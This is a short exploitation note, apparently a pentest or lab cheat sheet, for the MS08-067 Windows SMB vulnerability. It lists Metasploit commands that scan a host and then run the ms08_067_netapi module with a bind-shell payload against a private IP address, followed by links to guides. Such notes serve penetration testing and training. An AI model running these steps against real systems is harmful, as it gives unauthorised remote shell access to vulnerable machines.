# MS08-067
MS08-067  

Vulnerability reference:
 * [MS08-067](https://technet.microsoft.com/library/security/ms08-067)
 * [CVE-2008-4250](http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-4250)
 
## Usage

```
msf > db_status
msf > db_nmap -sS -sV -O --script=smb-check-vulns.nse -n 192.168.229.137
msf > search ms08_067
msf > use exploit/windows/smb/ms08_067_netapi
msf  exploit(ms08_067_netapi) > set RHOST 192.168.229.137
msf  exploit(ms08_067_netapi) > set payload windows/shell_bind_tcp
msf  exploit(ms08_067_netapi) > exploit
```

## References
+ [ms08-067漏洞 远程溢出入侵测试](http://blog.csdn.net/sysprogram/article/details/8016776)
+ [kali攻击漏洞MS08_067](http://jingyan.baidu.com/article/9f63fb918dcadfc8400f0e28.html)




